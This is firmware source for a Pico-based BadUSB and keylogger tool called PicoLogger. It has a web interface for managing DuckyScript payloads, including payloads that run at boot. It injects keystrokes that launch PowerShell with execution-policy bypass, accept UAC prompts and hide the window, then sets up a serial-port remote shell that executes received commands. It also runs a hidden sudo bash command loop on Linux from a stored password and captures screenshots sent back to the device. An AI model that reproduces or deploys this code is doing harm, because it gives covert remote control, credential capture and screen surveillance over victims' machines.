
void routeWithLog(const char* path, HTTPMethod method, std::function<void()> handler, const char* message) {
    server.on(path, method, [handler, message]() {
      if (liveCaptureActive){
        printout("\n");
        printout(message);
      }
        lastPrintWasRoute = true;
        handler();
    });
}

// =================================================== WiFi Config Functions ========================================================

void saveWiFiSettings(String ssid, String password, bool wifiState, String layout) {
    File file = LittleFS.open("/config.txt", "w");
    if (file) {
        file.println("SSID:" + ssid);
        file.println("Password:" + password);
        file.println("WiFiState:" + String(wifiState ? "ON" : "OFF"));
        file.println("Layout:" + layout);
        file.println("SCREEN:" + String(invertedState ? "INVERTED" : "NORMAL"));
        file.close();
        Serial.println("WiFi settings saved.");
    } else {
        Serial.println("Failed to save WiFi settings.");
    }
    setLayout();
}

void loadWiFiSettings() {
    File file = LittleFS.open("/config.txt", "r");
    if (!file) {
        Serial.println("No saved WiFi settings found. Using defaults.");
        saveWiFiSettings(ssid, password, true, layout);
        return;
    }
    while (file.available()) {
        String line = file.readStringUntil('\n');
        line.trim();

        if (line.startsWith("SSID:")) {
            ssid = line.substring(5);
        } else if (line.startsWith("Password:")) {
            password = line.substring(9);
        } else if (line.startsWith("WiFiState:")) {
            String state = line.substring(10);
            wifiState = (state == "ON");
        } else if (line.startsWith("SCREEN:")) {
            String screen = line.substring(7);
            invertedState = (screen == "INVERTED");
        } else if (line.startsWith("Layout:")) {
            layout = line.substring(7);
        }
    }

    file.close();
    Serial.println("Loaded saved WiFi settings.");
}

bool loadWiFiState() {
    loadWiFiSettings();
    return wifiState;
}

void saveWiFiState(bool state) {
    wifiState = state;
    saveWiFiSettings(ssid, password, state, layout);
}

void changeSSID(String newSSID) {
    if (newSSID.length() > 0) {
        ssid = newSSID;
        Serial.println("SSID changed to: " + ssid);
        saveWiFiSettings(ssid, password, wifiState, layout);
    } else {
        Serial.println("Error: SSID cannot be empty.");
    }
}

void changePassword(String newPassword) {
    if (newPassword.length() >= 8) {
        password = newPassword;
        Serial.println("Password changed.");
        saveWiFiSettings(ssid, password, wifiState, layout);
    } else {
        Serial.println("Error: Password must be at least 8 characters.");
    }
}

void handleSaveSettings() {
    if (server.hasArg("ssid") && server.hasArg("password") && server.hasArg("wifiState")) {
        String newSSID = server.arg("ssid");
        String newPassword = server.arg("password");
        bool WiFiState = (server.arg("wifiState") == "ON");
        String newLayout = server.hasArg("layout") ? server.arg("layout") : "us";
        changeSSID(newSSID);
        changePassword(newPassword);
        saveWiFiState(WiFiState);
        layout = newLayout;
        saveWiFiSettings(newSSID, newPassword, WiFiState, layout);
        server.send(200, "text/plain", "Settings saved");
    } else {
        server.send(400, "text/plain", "Missing settings");
    }
}

void handleLoadSettings() {
    loadWiFiSettings();
    String settingsJson = "{\"ssid\":\"" + ssid + "\",\"password\":\"" + password + "\",\"wifiState\":\"" + (wifiState ? "ON" : "OFF") + "\",\"layout\":\"" + layout + "\"}";
    server.send(200, "application/json", settingsJson);
}

// ==================================================== BadUSB Functions ===================================================================

void executePayload(const String &filename) {
    String filepath = "/payloads/" + filename;
    File file = LittleFS.open(filepath, "r");
    if (!file) {
        Serial.println("[ERROR] Failed to open payload: " + filename);
        return;
    }
    Serial.println("[INFO] Running DuckyScript payload: " + filename);   
    while (file.available()) {
        String line = file.readStringUntil('\n');
        line.trim();        
        if (line.startsWith("DELAY ")) {
            int time = line.substring(6).toInt();
            delay(time);
        }else if (line.startsWith("STRING ")) {
            Keyboard.print(line.substring(7));
        }else if (line.startsWith("STRINGLN ")) {
            Keyboard.println(line.substring(9));
        }else if (line == "ENTER") {
            Keyboard.press(KEY_RETURN);
            delay(100);
            Keyboard.releaseAll();
        }else if (line == "TAB") {
            Keyboard.press(KEY_TAB);
            delay(100);
            Keyboard.releaseAll();
        }else if (line == "SPACE") {
            Keyboard.press(' ');
            delay(100);
            Keyboard.releaseAll();
        }else if (line == "BACKSPACE") {
            Keyboard.press(KEY_BACKSPACE);
            delay(100);
            Keyboard.releaseAll();
        }else if (line == "ESC") {
            Keyboard.press(KEY_ESC);
            delay(100);
            Keyboard.releaseAll();
        }else if (line == "CTRL-SHIFT ENTER") {
            Keyboard.press(KEY_LEFT_CTRL);
            Keyboard.press(KEY_LEFT_SHIFT);
            Keyboard.press(KEY_RETURN);
            delay(100);
            Keyboard.releaseAll();
        }else if (line == "GUI") {
            Keyboard.press(KEY_LEFT_GUI);
            delay(100);
            Keyboard.releaseAll();
        }else if (line.startsWith("GUI ")) {
            String key = line.substring(4);
            Keyboard.press(KEY_LEFT_GUI);
            if (key.length() == 1) {
                Keyboard.press(key[0]);
            }
            delay(100);
            Keyboard.releaseAll();
        }else if (line.startsWith("CTRL ")) {
            String key = line.substring(5);
            Keyboard.press(KEY_LEFT_CTRL);
            if (key.length() == 1) {
                Keyboard.press(key[0]);
            }
            delay(100);
            Keyboard.releaseAll();
        }else if (line.startsWith("SHIFT ")) {
            String key = line.substring(6);
            Keyboard.press(KEY_LEFT_SHIFT);
            if (key.length() == 1) {
                Keyboard.press(key[0]);
            }
            delay(100);
            Keyboard.releaseAll();
        }else if (line.startsWith("ALT ")) {
            String key = line.substring(4);
            Keyboard.press(KEY_LEFT_ALT);
            if (key.length() == 1) {
                Keyboard.press(key[0]);
            }
            delay(100);
            Keyboard.releaseAll();
        }
    }
    file.close();
    Serial.println("[INFO] Payload execution complete: " + filename);
}

void listPayloads() {
    String json = "[";
    Dir dir = LittleFS.openDir("/payloads");
    while (dir.next()) {
        if (json.length() > 1) json += ",";
        json += "\"" + dir.fileName() + "\"";
    }
    json += "]";
    server.send(200, "application/json", json);
}

void editPayload() {
    if (!server.hasArg("filename") || !server.hasArg("content")) {
        server.send(400, "text/plain", "Missing filename or content");
        return;
    }
    String filename = "/payloads/" + server.arg("filename");
    String content = server.arg("content");
    File file = LittleFS.open(filename, "w");
    if (!file) {
        server.send(500, "text/plain", "Failed to open file for writing");
        return;
    }
    file.print(content);
    file.close();
    server.send(200, "text/plain", "Payload updated successfully");
}

void savePayload() {
    if (!server.hasArg("filename") || !server.hasArg("content")) {
        server.send(400, "text/plain", "Missing parameters");
        return;
    }
    String filename = server.arg("filename");
    String content = server.arg("content");
    File file = LittleFS.open("/payloads/" + filename, "w");
    if (!file) {
        server.send(500, "text/plain", "File write failed");
        return;
    }
    file.print(content);
    file.close();
    server.send(200, "text/plain", "Saved successfully");
}

void deletePayload() {
    if (!server.hasArg("filename")) {
        server.send(400, "text/plain", "Missing filename");
        return;
    }
    String filename = "/payloads/" + server.arg("filename");
    if (LittleFS.remove(filename)) {
        server.send(200, "text/plain", "Deleted successfully");
    } else {
        server.send(500, "text/plain", "Delete failed");
    }
}

void runPayload() {
    if (!server.hasArg("filename")) {
        server.send(400, "text/plain", "Missing filename");
        return;
    }
    String filename = server.arg("filename");
    executePayload(filename);
    server.send(200, "text/plain", "Payload executed");
}

// ====================================================== Payload On Boot Functions ===========================================================
void handleGetPayload() {
    if (!server.hasArg("filename")) {
        server.send(400, "text/plain", "Missing filename");
        return;
    }
    String filename = "/payloads/" + server.arg("filename");
    File file = LittleFS.open(filename, "r");
    if (!file) {
        server.send(404, "text/plain", "File not found");
        return;
    }
    String fileContent = file.readString();
    file.close();
    server.send(200, "text/plain", fileContent);
}

void EnablePayloadOnBoot(String filename) {
    File file = LittleFS.open("/config_pob.txt", "a");
    if (!file) {
        server.send(500, "text/plain", "Failed to open boot payloads file");
        return;
    }
    file.println(filename);
    file.close();
    server.send(200, "text/plain", "Payload enabled on boot");
}

void DisablePayloadOnBoot(String filename) {
    File file = LittleFS.open("/config_pob.txt", "r");
    if (!file) {
        server.send(500, "text/plain", "Failed to open boot payloads file");
        return;
    }
    String updatedList = "";
    while (file.available()) {
        String line = file.readStringUntil('\n');
        line.trim();
        if (line != filename) {  
            updatedList += line + "\n";
        }
    }
    file.close();
    file = LittleFS.open("/config_pob.txt", "w");
    if (!file) {
        server.send(500, "text/plain", "Failed to update boot payloads file");
        return;
    }
    file.print(updatedList);
    file.close();
    server.send(200, "text/plain", "Payload disabled on boot");
}

void handleTogglePayloadOnBoot() {
    if (!server.hasArg("filename") || !server.hasArg("enable")) {
        server.send(400, "text/plain", "Missing arguments");
        return;
    }
    String filename = server.arg("filename");
    bool enable = server.arg("enable") == "1";
    if (enable) {
        EnablePayloadOnBoot(filename);
    } else {
        DisablePayloadOnBoot(filename);
    }
}

void checkBootPayloads() {
    File file = LittleFS.open("/config_pob.txt", "r");
    if (!file) {
        Serial.println("[INFO] No boot payloads found.");
        return;
    }
    while (file.available()) {
        String filename = file.readStringUntil('\n');
        filename.trim();
        
        Serial.println("[INFO] Executing boot payload: " + filename);
        executePayload(filename);
    }   
    file.close();
}

void handleListBootPayloads() {
    if (!LittleFS.exists("/boot_payloads.txt")) {
        server.send(200, "application/json", "[]");
        return;
    }
    File file = LittleFS.open("/config_pob.txt", "r");
    if (!file) {
        server.send(500, "application/json", "[]");
        return;
    }
    String json = "[";
    bool first = true;
    while (file.available()) {
        String payload = file.readStringUntil('\n');
        payload.trim();
        if (payload.length() > 0) {
            if (!first) json += ",";
            first = false;
            json += "\"" + payload + "\"";
        }
    }
    json += "]";
    file.close();
    server.send(200, "application/json", json);
}

// ====================================================== Keylogger Functions =============================================================
String readLogFile() {
    File file = LittleFS.open("/keys.txt", "r");
    if (!file) {
        return "Error: Unable to open log file.";
    }
    String content;
    while (file.available()) {
        content += (char)file.read();
    }
    file.close();
    return content;
}

void handleClearLogs() {
    File f = LittleFS.open("/keys.txt", "w");
    if (f) {
        f.write("");
        f.close();
        Serial.println("Log file cleared.");
    }
    server.sendHeader("Location", "/", true);
    server.send(303);
}

// ======================================================== Settings Functions ============================================================

void handleFormatLittleFS() {
    if (LittleFS.begin()) {
        LittleFS.format();
        server.send(200, "text/plain", "LittleFS formatted successfully");
    } else {
        server.send(500, "text/plain", "Failed to format LittleFS");
    }
}



// ======================================================== Virtual Keyboard Functions ==========================================================

void handleKeyPress() {
    if (server.hasArg("key")) {
        String keyCombo = server.arg("key");
        Serial.print("Key Pressed: ");
        Serial.println(keyCombo);
        bool guiPressed = false;
        bool altPressed = false;
        bool ctrlPressed = false;
        String key = "";
        std::vector<String> keys;
        int start = 0;
        int index = keyCombo.indexOf('+');
        while (index != -1) {
            keys.push_back(keyCombo.substring(start, index));
            start = index + 1;
            index = keyCombo.indexOf('+', start);
        }
        keys.push_back(keyCombo.substring(start));
        for (String k : keys) {
            k.trim();
            if (k.equalsIgnoreCase("CTRL")) ctrlPressed = true;
            else if (k.equalsIgnoreCase("ALT")) altPressed = true;
            else if (k.equalsIgnoreCase("GUI")) guiPressed = true;
            else key = k;
        }
        if (guiPressed && key.length() == 0) {
            Keyboard.press(KEY_LEFT_GUI);
            delay(100);
            Keyboard.releaseAll();
        } else {
            if (guiPressed) Keyboard.press(KEY_LEFT_GUI);
            if (altPressed) Keyboard.press(KEY_LEFT_ALT);
            if (ctrlPressed) Keyboard.press(KEY_LEFT_CTRL);
            if (key.length() == 1) {
                Keyboard.press(key[0]);
            } else if (key.equalsIgnoreCase("ENTER")) {
                Keyboard.press(KEY_RETURN);
            } else if (key.equalsIgnoreCase("TAB")) {
                Keyboard.press(KEY_TAB);
            } else if (key.equalsIgnoreCase("SPACE")) {
                Keyboard.press(' ');
            } else if (key.equalsIgnoreCase("BACKSPACE")) {
                Keyboard.press(KEY_BACKSPACE);
            } else if (key.equalsIgnoreCase("ESC")) {
                Keyboard.press(KEY_ESC);
            }
            delay(100);
            Keyboard.releaseAll();
        }
        server.send(200, "text/plain", "Key sent: " + keyCombo);
    } else {
        server.send(400, "text/plain", "Missing key parameter");
    }
}



// =================================================== Remote Shell Page ======================================================

void handlePsAgent() {
    bool isAdmin = fromMenu ? psAgentAdminFlag : server.arg("admin") == "1";
    bool isHidden = fromMenu ? psAgentHiddenFlag : server.arg("hidden") == "1"; 
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("powershell -Ep Bypass");
  delay(100);
  if (isAdmin) {
      Keyboard.press(KEY_LEFT_CTRL);
      Keyboard.press(KEY_LEFT_SHIFT);
      Keyboard.press(KEY_RETURN);
      delay(100);
      Keyboard.releaseAll();
      delay(2500);
      Keyboard.press(KEY_LEFT_ALT);
      Keyboard.print("y");
      delay(100);
      Keyboard.releaseAll();
  }
  else{
      Keyboard.press(KEY_RETURN);
      delay(100);
      Keyboard.releaseAll();
  }
  delay(4000);
  if (isHidden) {
      Keyboard.print("$a='[DllImport(\"user32.dll\")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);';$t=Add-Type -M $a -name Win32ShowWindowAsync -ns Win32Functions -Pas;");
      Keyboard.print("$h=(Get-Process -PID $pid).MainWindowHandle;$Host.UI.RawUI.WindowTitle='xx';$x=(Get-Process | Where-Object{$_.MainWindowTitle -eq 'xx'});$t::ShowWindowAsync($x.MainWindowHandle,0);");
      delay(100);
  }
  Keyboard.print("function fp{(Get-WMIObject Win32_SerialPort | Where-Object PNPDeviceID -match \"VID_239A\").DeviceID}$d=fp;$p=New-Object System.IO.Ports.SerialPort $d,115200,None,8,one;$p.DtrEnable=$true;$p.RtsEnable=$true;$p.Open();");
  Keyboard.print("$s=Sleep -M 100;while($true){if($p.BytesToRead -gt 0){$s;$c = $p.ReadLine().Trim();$p.DiscardInBuffer() ;if($c){try{$o=ie`x $c 2>&1;$r=if($o){$o -join \"`n\"}else{\"[Command executed]\"}}catch{$r=\"$_\"}$p.WriteLine($r)}}$s}");
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  if (fromMenu){
    fromMenu = false;
  }else{
    server.send(200, "text/plain", "Agent Deployed");
  }
}

String executePowerShell(String command) {
    Serial.println(command);
    String response = "";
    unsigned long timeout = millis() + 2000;
    while (millis() < timeout) {
        if (Serial.available()) {
            char c = Serial.read();           
            response += c;
        }
    }   
    response.trim();
    server.send(200, "text/plain", response);
    return response.length() > 0 ? response : "No response from host.";
}

void handleExecuteCommand() {
    if (!server.hasArg("command")) {
        server.send(400, "text/plain", "Missing command");
        return;
    }
    String command = server.arg("command");
    Serial.println(command);
    String result = executePowerShell(command);
    server.send(200, "text/plain", result);
}



// ========================================================= Linux Agent ===================================================================


void handleLinuxAgent() {
    bool isHidden = fromMenu ? linuxAgentHiddenFlag : server.arg("hidden") == "1"; 
    String password = server.arg("password");
    if (password.length() == 0) {
        File sudoFile = LittleFS.open("/sudo.txt", "r");
        if (sudoFile) {
            password = sudoFile.readStringUntil('\n');
            sudoFile.close();
        }else{
          Serial.println("Error: Password not found!");
          if (fromMenu){
            fromMenu = false; 
            return; 
          }else{
            server.send(500, "text/plain", "No password available!");
            return;
          }
        }
    } 
    delay(1000);
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press('t');
    delay(100);
    Keyboard.releaseAll();
    delay(500);

    Keyboard.print("echo " + password + " | sudo -S ");
    if (isHidden) {
      Keyboard.print("nohup ");
    }
    Keyboard.print("bash -c 'BAUD_RATE=115200; VID=\"239a\"; PID=\"cafe\"; echo \"Searching for Pico with VID:$VID PID:$PID...\";");
    Keyboard.print("if ! lsusb | grep -i \"${VID}:${PID}\" > /dev/null; then echo \"Pico not found!\"; exit 1; fi; echo \"Pico detected.\";");
    Keyboard.print("DEVICE=$(ls -t /dev/ttyACM* 2>/dev/null | head -n 1); if [ -z \"$DEVICE\" ]; then echo \"No /dev/ttyACM* device found.\"; exit 1; fi; echo \"Using serial device: $DEVICE\";");
    Keyboard.print("stty -F \"$DEVICE\" $BAUD_RATE cs8 -cstopb -parenb -icanon -echo;");
    Keyboard.print("last_command=\"\"; while true; do if read -t 0.5 -r line < \"$DEVICE\"; then command=$(echo \"$line\" | xargs); if [ -n \"$command\" ] && [ \"$command\" != \"$last_command\" ]; then echo \"Received: $command\"; last_command=$command; output=$(bash -c \"$command\" 2>&1); response=\"${output:-[Command executed successfully, no output]}\"; echo \"Sending response...\"; echo \"$response\" > \"$DEVICE\"; sleep 0.1; fi; fi; sleep 0.2; done'");
    
    if (isHidden) {
        Keyboard.print(" > /dev/null 2>&1 & disown");
    }
    
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();

    if (isHidden) {
      delay(1000);
      Keyboard.press(KEY_RETURN);
      delay(100);
      Keyboard.releaseAll();
      delay(1000);
      
      Keyboard.print("exit");
      delay(100);
      Keyboard.press(KEY_RETURN);
      delay(100);
      Keyboard.releaseAll();
    }
    
    if (fromMenu){
      fromMenu = false;
    }else{
      server.send(200, "text/plain", "Linux Agent Deployed");
    }
}


// =========================================================== Screenshot Page =================================================================

String base64Image = "";  
bool receivingImage = false;

void handleSSAgent() {
  bool isHidden = fromMenu ? ssAgentHiddenFlag : (server.arg("hidden") == "1");
  int q = server.arg("q").toInt();
  int s = server.arg("s").toInt();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("powershell -Ep Bypass");
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(4000);
  if (isHidden) {
      Keyboard.print("$a='[DllImport(\"user32.dll\")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);';$t=Add-Type -M $a -name Win32ShowWindowAsync -ns Win32Functions -Pas;");
      Keyboard.print("$h=(Get-Process -PID $pid).MainWindowHandle;$Host.UI.RawUI.WindowTitle='xx';$x=(Get-Process | Where-Object{$_.MainWindowTitle -eq 'xx'});$t::ShowWindowAsync($x.MainWindowHandle,0);");
      delay(100);
  }
  if (fromMenu){
      Keyboard.print("$s=2;$q=10;");
  }else{
      Keyboard.print("$q = "); Keyboard.print(String(q)); Keyboard.print(";");
      Keyboard.print("$s = "); Keyboard.print(String(s)); Keyboard.print(";");
  }
  Keyboard.print("Add-Type -AssemblyName System.Windows.Forms;Add-Type -AssemblyName System.Drawing;");
  Keyboard.print("Add-Type -TypeDefinition \"using System;using System.Runtime.InteropServices;using System.Drawing;using System.Drawing.Imaging;public class ScreenCapture{[DllImport(`\"user32.dll`\")]public static extern IntPtr GetWindowDC(IntPtr hWnd);[DllImport(`\"user32.dll`\")]public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);[DllImport(`\"gdi32.dll`\")]public static extern int BitBlt(IntPtr hdcDest,int nXDest,int nYDest,int nWidth,int nHeight,IntPtr hdcSrc,int nXSrc,int nYSrc,int dwRop);public static void CaptureFullScreen(string filePath,int width,int height){Bitmap bitmap=new Bitmap(width, height)");
  Keyboard.print(";Graphics g=Graphics.FromImage(bitmap);IntPtr hdcDest=g.GetHdc();IntPtr hdcSrc=GetWindowDC(IntPtr.Zero);BitBlt(hdcDest, 0, 0, width, height, hdcSrc, 0, 0, 0x00CC0020);ReleaseDC(IntPtr.Zero, hdcSrc);g.ReleaseHdc(hdcDest);Bitmap resizedBitmap=new Bitmap(bitmap,new Size(bitmap.Width/$s,bitmap.Height/$s));SaveJpegWithQuality(resizedBitmap,filePath,$q);bitmap.Dispose();resizedBitmap.Dispose();g.Dispose();}private static void SaveJpegWithQuality(Bitmap bitmap,string path,long quality){ImageCodecInfo jpegCodec=GetEncoderInfo(`\"image/jpeg`\")");
  Keyboard.print(";Encoder qualityEncoder=Encoder.Quality;EncoderParameters encoderParams=new EncoderParameters(1);EncoderParameter qualityParam=new EncoderParameter(qualityEncoder, quality);encoderParams.Param[0]=qualityParam;bitmap.Save(path,jpegCodec,encoderParams);}private static ImageCodecInfo GetEncoderInfo(string mimeType){ImageCodecInfo[] codecs=ImageCodecInfo.GetImageEncoders();foreach(ImageCodecInfo codec in codecs){if(codec.MimeType == mimeType){return codec;}}return null;}}\" -ReferencedAssemblies 'System.Drawing','System.Windows.Forms'");
  Keyboard.print(";function Snap{$f = \"$env:TEMP\\screenshot.jpg\";$d = [System.Windows.Forms.Screen]::PrimaryScreen;[ScreenCapture]::CaptureFullScreen($f,$d.Bounds.Width,$d.Bounds.Height);$b = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($f));$l = $b.Length;$p.WriteLine(\"[SIZE]$l\");$p.WriteLine(\"[BEGIN]\");$c = 512;for($i = 0;$i -lt $b.Length;$i += $c){$z=$b.Substring($i,[Math]::Min($c,$b.Length - $i));$p.WriteLine(\"[CHUNK]$z\")}$p.WriteLine(\"[END]\");Write-Host \"Sent : $l bytes\"}");
  Keyboard.print(";function Com{$ps=Get-WMIObject Win32_SerialPort | Where-Object{$_.PNPDeviceID -match \"VID_239A\"};return $ps.DeviceID}$x = Com;$p = New-Object System.IO.Ports.SerialPort $x,115200,None,8,one;$p.DtrEnable = $true;$p.RtsEnable = $true;$p.Open();while($true){if($p.BytesToRead -gt 0){$y = $p.ReadLine().Trim();if($y -eq \"take screenshot\"){Snap}if($y -eq \"exit agent\"){exit}}Start-Sleep -M 200}");
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  if (fromMenu){
    fromMenu = false;
  }else{
    server.send(200, "text/plain", "Agent Deployed");
  }
}

void handleTakeScreenshot() {
     base64Image = "";
    Serial.println("take screenshot");
    if (fromMenu){
      fromMenu = false;
    }else{
      server.send(200, "text/plain", "Screenshot command sent");
    }
}

void handleExitAgent() {
    Serial.println("exit agent");
    if (fromMenu){
      fromMenu = false;
    }else{
      server.send(200, "text/plain", "Exit command sent");
    }
}

void handleGetScreenshot() {
    server.send(200, "text/plain", base64Image);
}

void handleSavedScreenshot() {
    if (LittleFS.exists("/screenshot.jpg")) {
        File file = LittleFS.open("/screenshot.jpg", "r");
        server.streamFile(file, "image/jpeg");
        file.close();
    } else {
        server.send(404, "text/plain", "No screenshot available.");
    }
}

void readSerialScreenshot() {
    static String base64Buffer = "";
    static int expectedSize = 0;
    static bool receivingImage = false;    
    while (Serial.available()) {
        String line = Serial.readStringUntil('\n');
        line.trim();
        if (line.startsWith("[SIZE]")) {
            expectedSize = line.substring(6).toInt();
        } else if (line == "[BEGIN]") {
            base64Buffer = "";
            receivingImage = true;
        } else if (line == "[END]") {
            receivingImage = false;
            if (base64Buffer.length() == expectedSize) {
                LittleFS.remove("/screenshot.jpg"); 
                int decodedLen = base64_dec_len(base64Buffer.c_str(), base64Buffer.length());
                char *decoded = (char *)malloc(decodedLen);
                base64_decode(decoded, base64Buffer.c_str(), base64Buffer.length());
                File file = LittleFS.open("/screenshot.jpg", "w");
                if (file) {
                    file.write((uint8_t *)decoded, decodedLen);
                    file.close();
                    Serial.println("Image saved to LittleFS.");
                } else {
                    Serial.println("Failed to save image.");
                }
                free(decoded);
            } else {
                Serial.println("Error: Incomplete image received.");
            }
            base64Buffer = "";
        } else if (line.startsWith("[CHUNK]") && receivingImage) {
            base64Buffer += line.substring(7);
        }
    }
}

void handleDownload() {
    if (!server.hasArg("file")) {
        server.send(400, "text/plain", "Bad Request: No file specified");
        return;
    }
    String filePath = server.arg("file");
    if (filePath.startsWith("/")) {
        filePath = filePath.substring(1);
    }
    if (LittleFS.exists("/" + filePath)) {
        File file = LittleFS.open("/" + filePath, "r");
        if (!file) {
            server.send(500, "text/plain", "Failed to open file for download");
            return;
        }
        String contentType = "application/octet-stream";
        server.sendHeader("Content-Disposition", "attachment; filename=" + filePath);
        server.streamFile(file, contentType);
        file.close();
    } else {
        server.send(404, "text/plain", "File not found");
    }
}

void handleEdit() {
    if (!server.hasArg("file")) {
        server.send(400, "text/plain", "Bad Request: No file specified");
        return;
    }

    String filePath = server.arg("file");
    if (!LittleFS.exists(filePath)) {
        server.send(404, "text/plain", "File not found");
        return;
    }

    File file = LittleFS.open(filePath, "r");
    if (!file) {
        server.send(500, "text/plain", "Failed to open file for editing");
        return;
    }

    String fileContent = file.readString();
    file.close();

    String html = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
        <title>PicoLogger | Edit File</title>
        <style>
            body{font-family:Arial,sans-serif;text-align:center;margin:0;padding:0;background-color:#1e1e1e;color:#fff}
            .container{margin:20px auto;width:80%;max-width:1000px;padding:20px;background:#222;border-radius:10px;box-shadow:0 0 10px rgba(255,255,255,.1)}
            h2{text-align:center;color:#fc0}
            textarea{width:80%;height:300px;margin:10px;border-radius:5px;padding:10px;background:#333;color:#fff}
            button{padding:10px 20px;margin:10px;background:#fc0;color:#000;font-weight:700;border:none;border-radius:5px;cursor:pointer}
            .ascii-container{color:#fc0;display:auto;justify-content:center;align-items:center;width:100%;overflow:auto;font-size:14px;font-weight:700}
            .ascii-art{background:0 0;border:none;padding:0;font-size:14px;font-weight:700;color:#fc0;text-align:center}
            .footer{text-align:center;color:#fc0;font-size:14px;background:#333;position:fixed;width:100%;bottom:0}
            .footer a{color:#fc0;text-decoration:none;transition:.3s}
        </style>
    </head>
    <body>
        <div class="ascii-container" align="center">
            <pre class="ascii-art">
   ___                 _                                  
  (  _ \ _            ( )                                 
  | |_) )_)  ___   _  | |      _     __    __    __  _ __ 
  |  __/| |/ ___)/ _ \| |  _ / _ \ / _  \/ _  \/ __ \  __)
  | |   | | (___( (_) ) |_( ) (_) ) (_) | (_) |  ___/ |   
  (_)   (_)\____)\___/(____/ \___/ \__  |\__  |\____)_)   
                                  ( )_) | )_) |           
                                   \___/ \___/            
            </pre>
        </div>
        <div class="container">
        <h2>Edit File</h2> <code>)rawliteral" + filePath + R"rawliteral(</code>
        <form action="/save" method="POST">
            <textarea name="content">)rawliteral" + fileContent + R"rawliteral(</textarea><br>
            <input type="hidden" name="file" value=")rawliteral" + filePath + R"rawliteral(">
            <button type="submit">Save</button>
        </form>
        </div>
        <div class="footer"><p>Made by @beigeworm | github.com/beigeworm</p></div>
    </body>
    </html>
    )rawliteral";

    server.send(200, "text/html", html);
}

void handleSave() {
    if (!server.hasArg("file") || !server.hasArg("content")) {
        server.send(400, "text/plain", "Bad Request: Missing file or content");
        return;
    }

    String filePath = server.arg("file");
    String content = server.arg("content");

    File file = LittleFS.open(filePath, "w");
    if (!file) {
        server.send(500, "text/plain", "Failed to save file");
        return;
    }

    file.print(content);
    file.close();
            server.sendHeader("Location", "/explorer", true);
            server.send(303);
}

void handleDelete() {
    if (!server.hasArg("file")) {
        server.send(400, "text/plain", "Bad Request: No file specified");
        return;
    }

    String filePath = server.arg("file");
    if (LittleFS.exists(filePath)) {
        if (LittleFS.remove(filePath)) {
            server.sendHeader("Location", "/explorer", true);
            server.send(303);
        } else {
            server.send(500, "text/plain", "Failed to delete file");
        }
    } else {
        server.send(404, "text/plain", "File not found");
    }
}
